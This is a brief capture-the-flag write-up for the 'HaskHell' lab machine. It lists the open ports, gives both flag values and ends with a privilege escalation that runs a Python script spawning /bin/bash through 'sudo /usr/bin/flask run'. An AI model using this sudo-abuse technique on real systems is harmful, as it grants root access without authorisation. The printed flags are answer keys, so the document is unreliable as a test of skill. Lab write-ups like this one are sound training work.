# Name = HaskHell
```
IP: export IP=10.10.68.222
```
Ports open
Port |Service
-----|----------
22   |ssh
5001 |gunicorn - web server

Directory list:
- /submit

User flag:
`flag{academic_dishonesty}`

Root flag
`flag{im_purely_functional}`

```bash
sudo -l
```
To obtain root we can use the ability to run /usr/bin/flask as root.
Simply write a script that spawns system:
```python
import os
os.system('/bin/bash')
```
Save it as python script, then add the script to variable FLASK_APP:
```bash
export FLASK_APP=script.py
```
run
```bash
sudo /usr/bin/flask run
```
Locate root flag at /root/root.txt